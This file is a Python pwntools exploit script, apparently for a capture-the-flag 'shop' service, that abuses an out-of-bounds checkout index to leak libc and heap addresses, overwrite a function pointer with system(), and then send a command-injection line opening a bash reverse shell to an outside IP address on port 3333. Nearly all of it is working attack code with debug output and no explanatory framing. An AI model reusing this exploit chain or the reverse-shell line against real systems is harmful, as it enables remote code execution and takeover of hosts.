#!/usr/bin/python


from pwn import *
import sys
from time import sleep
import re

MAX_MESS = 1024 * 5

def add_item(conn, name, desc, price):
    conn.send("a\n")
    conn.send(name)
    conn.send(desc)
    conn.send(price)
    conn.recvuntil('> ')


# def check_item(conn, idx, name):
#     conn.send("c\n")
#     buf = idx + 'x'
#     message = 'z' * (MAX_MESS - len(buf)) + buf
#     conn.sendline(message)
#
#     buffer = conn.recvuntil('> ')
#     if buffer.count('Buying') !=0 and name in buffer:
#         return True
#     else:
#         return False


def check_item(conn, idx, name):
    conn.send("c\n")
    buf = idx + 'x'
    message = 'z' * (MAX_MESS - len(buf)) + buf
    conn.sendline(message)

    buffer = conn.recvuntil('> ')
    if buffer.count('Buying') !=0 and name in buffer:
        print("Found -> %s <- at address %s" % (name, idx))

        return True
    else:
        return False


# def check_range(conn, idx, f=False):
#     conn.send("c\n")
#     if f == False:
#         buf = 'x'.join(idx)
#     elif f==True:
#         buf = ''.join(idx)
#
#     if len(buf) > MAX_MESS and f==False:
#         print("buffer bigger than a MAX_MESS")
#         print(len(buf))
#         sys.exit(0)
#
#     if f==False:
#         message = 'z' * (MAX_MESS - len(buf)) + buf
#     else:
#         message = buf
#
#     if len(buf) > 65540:
#         print("BAD RANGE")
#         sys.exit(0)
#     conn.sendline(message)
#     buffer = conn.recvuntil('> ', timeout=3)
#
#     if f == False:
#         print("****************** BUFFER ***********************")
#         print(message)
#         print(buffer)
#         print("**************** BUFFER END *********************")
#
#     cnt = buffer.count('Buying')
#     if cnt == 0:
#         return False
#
#     t = list()
#     b = buffer.split('Buying ')
#     for i in range(1, cnt+1):
#         off = b[i].find(' for $')
#         t.append(b[i][:off])
#
#     return t


def check_range(conn, idx, f=False):
    conn.send("c\n")
    if f == False:
        buf = '!'.join(idx)
    elif f==True:
        buf = ''.join(idx)

    if len(buf) > MAX_MESS and f==False:
        print("buffer bigger than a MAX_MESS")
        print(len(buf))
        sys.exit(0)

    if f==False:
        message = 'z' * (MAX_MESS - len(buf)) + buf
    else:
        message = buf

    if len(buf) > 65540:
        print("BAD RANGE")
        sys.exit(0)

    conn.sendline(message)
    buffer = conn.recvuntil('> ', timeout=3)

    if f == False and False:
        print("****************** BUFFER ***********************")
        print(message)
        print(buffer)
        print("**************** BUFFER END *********************")

    cnt = buffer.count('Buying')
    if cnt == 0:
        return False

    t = list()
    b = buffer.split('Buying ')
    for i in range(1, cnt+1):
        off = b[i].find(' for $')
        t.append(b[i][:off])

    return t



def null_bye(conn):
    conn.send("c\n")
    # conn.send("0001" * 65532/4 + '\n')
    conn.send("!" * 65530 + "\n")
    # conn.send("\x79" * 65539 + "\n")

    conn.recvuntil('> ', timeout=3)


def find_item_by_name(conn, name):

    print("Trying find name: %s" % (name))

    index = -1
    for y in range(0, 128):

        idx=list()
        start = y*512
        end   = (y+1)*512
        for i in range(start, end):
            idx.append('%04x' % (i))

        fnd = check_range(conn, idx)
        if fnd:
            print("Range %d - %d has %d item(s):" % (start, end, len(fnd)))
            for f in fnd:
                print("  %s" % (f))
            if fnd.count(name) == 2:
                index = y
                break

    if index == -1:
        print("BLYA DA KAK TAK")
        return

    t = index
    for y in range(t*256,(t+1)*256):
        n = '%04x' % y
        check_item(conn, n, name)


def find_item_in_range(conn, idx, name):
    founder = list()
    rsl = check_range(conn, idx, False)

    if rsl == False or name not in rsl:
        return []

    print("Have item in range")

    left = idx[:len(idx)/2]
    right = idx[len(idx)/2:]

    if len(left) == 1:
        if check_item(conn, left[0], name):
            founder.append(left[0])
    else:
        founder += find_item_in_range(conn, left, name)

    if len(right) == 1:
        if check_item(conn, right[0], name):
            founder.append(right[0])
    else:
        founder += find_item_in_range(conn, right, name)

    return founder


def buy_item_over(conn, num):
    conn.send("c\n")

    buf = ''
    # while buf<65540:
    #     buf += '%04x' % i
    #    i += 1
    for i in range(4096, 65536, 4):
        buf += '%04x' % (i + num)

    # buf += 'ffff'

    conn.send(buf)


def new_name(conn, buf):
    conn.send("n\n")
    conn.send(buf + '\n')
    conn.recvuntil('> ')


def buy_item_leak(conn):
    conn.sendline("c\n")
    conn.sendline("\n")
    # shopname = conn.recvuntil('Checkout in process...')
    shopname = conn.recvuntil('> ')
    return shopname
    # l = MemLeak(lambda a: shopname[a:a+16], reraise=False)
    # print(l.q(0))


def main():
    conn = None
    lcl = True
    try:
        sys.argv[1]
        conn = remote('shop.chal.pwning.xxx', 9916)
        lcl = False

    except:
        conn = remote('localhost', 5555)

    if conn is None:
        print("Does not connect :(")
        sys.exit(0)

    print(conn.recvuntil(':'))
    conn.sendline("AAAABBBB")

    all_elem = list()
    for i in range(0, 33):
        print("[+] Add item: %d" % (i))
        name = '%c' % (0x41 + i)
        all_elem.append(name*4)

        name = name * 4 + '\n'
        desc = 'Z' * 50 + '\n'
        add_item(conn, name, desc, '100.00\n'  )

    items = []
    idx = list()

    found_items = 0

    ranges = dict()
    for y in range(0, 64):

        idx = list()
        st = y*1024
        en = (y+1)*1024
        for i in range(st, en):
            idx.append('%04x' % (i))

        fnd = check_range(conn, idx)
        if fnd:
            print("Range %d - %d has %d item(s):" % (st, en, len(fnd)))
            found_items += len(fnd)
            ranges[y-1] = list()
            for f in fnd:
                ranges[y-1].append(f)
                print("  %s" % (f))
                all_elem.remove(f)

            if found_items >= 33:
                break

    print("ALL ELEMENTS WHICH DID NOT FIND:")
    print(all_elem)
    if len(all_elem) != 0:
        print("Bad bad bad")
        conn.recv()
        sys.exit(0)

    print(ranges)

    conn.recvuntil('> ', timeout=1)

    numbers = list()
    for num in ranges.keys():
        st = num*1024
        en = (num+1)*1024
        for name in ranges[num]:
            print("TRY FIND %s IN RANGE %04x - %04x" % (name,st,en))
            idx = list()
            for i in range(st, en):
                idx.append('%04x' % (i))
            a = find_item_in_range(conn, idx, name)
            print("********************")
            # print(a)
            numbers.append(a[0])


    # idx = list()
    # for y in numbers:
    #     # start = y*512
    #     # end   = (y+1)*512
    #     # for i in range(start,end):
    #     #     idx.append('%04x' % i)

    null_bye(conn)
    check_range(conn, numbers, True)
    # check_range(conn, idx, True)


    print(numbers)
    print(len(numbers))
    # print(found_items)

    conn.interactive()

    check_range(conn, numbers, True)

    payload = p64(0x6020a4)
    payload += p64(0x6020a4)

    payload += "\xAA" * (0x130 - 16)
    # payload += p64(0x602020)
    new_name(conn, payload)

    conn.recvuntil('> ', timeout=2)
    conn.send('\n')
    conn.recvuntil('> ', timeout=2)
    conn.send("l\n")
    data = conn.recvuntil('> ')
    print("*** data")
    print(data)
    print("***")
    print("Last string")
    print(data.split()[-2])
    # for zxc in data.split(': $0.00 - '):
    #     print(zxc)
    #     for zxc2 in zxc.split():
    #         print("%016x" % u64(zxc2.ljust(8,'\x00')))
    # print("!!!!!!!!!!")
    # L = u64(data.split(' $0.00 - ')[1].split()[1][:-1].ljust(8,'\x00'))
    # print("!!!!!!!!!!")

    name = data.split(' $0.00 - ')[2].split()[0]
    # name = data.split(' $0.00 -')[1]
    # name = name.split('\n')[1]
    # name = name[:-1]
    print("*** name")
    print(name)
    print("***")


    LIBC_ADDR = u64(name.ljust(8,'\x00'))
    libc_offset = 0x3b6840
    system_offset = 0x45210
    if lcl == False:
        libc_offset = 0x00000000003c48e0
        system_offset = 0x0000000000045390 # 0x45210

    LIBC_BASE = LIBC_ADDR - libc_offset # 0x3b6840
    STDIN = LIBC_BASE + libc_offset #0x3a5f50 # 0x3b6840


    # free_hook_offset = 0x3b8708
    # malloc_hook_offset = 0x3b6a70
    SYSTEM_ADDR = LIBC_BASE + system_offset
    # FREE_HOOK_ADDR = LIBC_BASE + free_hook_offset
    # MALLOC_HOOK_ADDR = LIBC_BASE + malloc_hook_offset


    print("LIBC_ADDR: 0x%016x" % LIBC_ADDR)
    print("LIBC_BASE: 0x%016x" % LIBC_BASE)
    print("SYSTEM_ADDR: 0x%016x" % SYSTEM_ADDR)
    # print("FREE_HOOK_ADDR: 0x%016x" % FREE_HOOK_ADDR)
    # print("MALLOC_HOOK_ADDR: 0x%016x" % MALLOC_HOOK_ADDR)

    # STDOUT = LIBC_BASE + 0x3b7580
    # BIN_SH = LIBC_BASE + 0x183af7
    # IO_FILE_JUMPS = LIBC_BASE + 0x3b33c0
    # IO_STR_OVERFLOW = IO_FILE_JUMPS + 0xd8
    # FAKE_VTABLE = IO_STR_OVERFLOW - 2*8

    # FREE_HOOK_HLP = 0x59c700 + LIBC_BASE


    null_bye(conn)

    conn.interactive()
    # find_item_by_name(conn, name)

    null_bye(conn)

    check_range(conn, numbers, True)

    payload = p64(0x6020b4)
    # payload += "\xAA" * (0x130 - 16)
    # payload += "\x31" * 8
    new_name(conn, payload)

    conn.recvuntil('> ', timeout=2)
    conn.send('\n')
    conn.recvuntil('> ', timeout=2)
    conn.send("l\n")
    data = conn.recvuntil('> ')
    print("*** data")
    print(data)
    print("***")
    # print("Last string")
    # blyat = data[data.find(' $0.00 - '):]
    # blyat = blyat[blyat.find(' $0.00 - '):]
    # print(blyat)

    name = data.split(' $0.00 - ')[2].split()[0]
    # name = data.split(' $0.00 -')[1]
    # name = name.split('\n')[1]
    # name = name[:-1]
    print("*** name")
    print(name)
    print("***")

    while len(name) != 8:
        name += b'\x00'

    HEAP_ADDR = u64(data.split()[-2].ljust(8,'\x00'))

    print("HEAP_ADDR: 0x%016x" % HEAP_ADDR)


    print("CREATES SYSTEM RANGE")
    pl = p64(0) + '\x7f'*8 + p64(0) +  p64(0) * ((0x130 - 32)/8)

    check_range(conn, numbers, True)

    SYSTEM_VTABLE = HEAP_ADDR + 0x1000
    STDIO_HEAP = HEAP_ADDR - 0x4b90 + 0xb0
    # payload = p64(0x6020b0)
    payload = p64(SYSTEM_VTABLE - 0x30)
    # payload += "\xAA" * (0x130 - 16)
    # payload += "\x31" * 8
    new_name(conn, payload)

    conn.send('c\n')
    conn.send('\n')
    conn.recvuntil('> ')

    print("WRITE STRING")
    new_name(conn, pl)

    check_range(conn, numbers, True)
    conn.interactive()

    print("REWRITE BSS")
    check_range(conn, numbers, True)

    # payload = p64(0x6020b0)
    # payload = p64(LIBC_ADDR+0xb0)
    # payload = p64(HEAP_ADDR + 0x1000)
    payload = p64(0x6020c8)
    # payload += "\xAA" * (0x130 - 16)
    # payload += "\x31" * 8
    new_name(conn, payload)

    conn.send('c\n')
    conn.send('\n')
    conn.recvuntil('> ')


    # pl = p64(0) + p64(0) + '\x00\x00\x00\x00\xff\xff\xff\xff' + p64(SYSTEM_VTABLE)
    """p64(STDOUT)"""

    pl = p64(0) + p64(STDIN)+p64(0)*((0x118 - 16)/8) + p64(0x602058)

    new_name(conn,pl)
    # null_bye(conn)

    new_name(conn,p64(SYSTEM_ADDR))

    conn.send("c\n")
    conn.send(";bash -i >& /dev/tcp/128.199.49.175/3333 0>&1 2>&1\n")

    conn.interactive()

    check_range(conn, numbers, True)

    # payload = p64(0x6020b0)
    # payload = p64(LIBC_ADDR+0xb0)
    # payload = p64(HEAP_ADDR + 0x1000)
    payload = p64(HEAP_ADDR+0x500)
    # payload += "\xAA" * (0x130 - 16)
    # payload += "\x31" * 8
    new_name(conn, payload)

    conn.send('c\n')
    conn.send('\n')
    conn.recvuntil('> ')


    # pl = p64(0) + p64(0) + '\x00\x00\x00\x00\xff\xff\xff\xff' + p64(SYSTEM_VTABLE)
    """p64(STDOUT)"""
    pl = p64(0) * 5 + p64(STDIN)+p64(0)*((0x130 - 40)/8)

    new_name(conn,pl)
    null_bye(conn)


    # find_item_in_range(conn, idx)




    # buy_item_over(conn)

    # shopname = buy_item_leak(conn)
    # while 'Checkout in process...' not in shopname:
    #     shopname = buy_item_leak(conn)

    # print("-------------")
    # print(shopname)
    # print("-------------")

    # while conn.recv(timeout=1) != '':
    #     pass

    # memleak = shopname.split(' Checkout in process...')[0]
    # print(":".join("{:02x}".format(ord(c)) for c in memleak))
    # print(memleak)
    # if len(memleak) < 8:
    #     print("[-] Bad")
    # else:
    #     i = 0
    #     while i < len(memleak)-8:
    #         print(memleak[i:i+8])
    #         # print("[+] 0x%016x" % u64(memleak[i:i+8]))
    #         i += 8

    # conn.interactive()


if __name__ == '__main__':
    main()
